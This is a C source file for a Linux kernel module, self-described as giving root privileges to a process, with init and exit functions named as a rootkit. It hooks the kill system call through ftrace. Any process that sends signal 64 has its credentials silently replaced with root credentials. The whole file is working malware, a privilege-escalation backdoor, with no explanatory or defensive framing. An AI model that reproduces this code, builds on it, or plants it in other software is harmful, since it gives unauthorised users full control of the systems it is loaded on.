#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("X");
MODULE_DESCRIPTION("Giveing root privileges to a process");
MODULE_VERSION("0.02");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs)
{
	void set_root(void);

	// pid_t pid = regs->di;
	int sig = regs->si;

	if ( sig == 64 )
	{
		printk(KERN_INFO "setroot: giving root...\n");
		set_root();
		return 0;
	}

	return orig_kill(regs);
}

#else
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
	void set_root(void);

	if ( sig == 64 )
	{
		printk(KERN_INFO "setroot: giving root...\n");
		set_root();
		return 0;
	}

	return orig_kill(pid, sig);
}
#endif

/* Replace creds struct with root */
void set_root(void)
{
	struct cred *root;
	root = prepare_creds();

	if ( root == NULL ) return;

	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
}

static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", hook_kill, &orig_kill),
};

static int __init rootkit_init(void)
{
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err) return err;

	printk(KERN_INFO "setroot: loaded\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "setroot: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
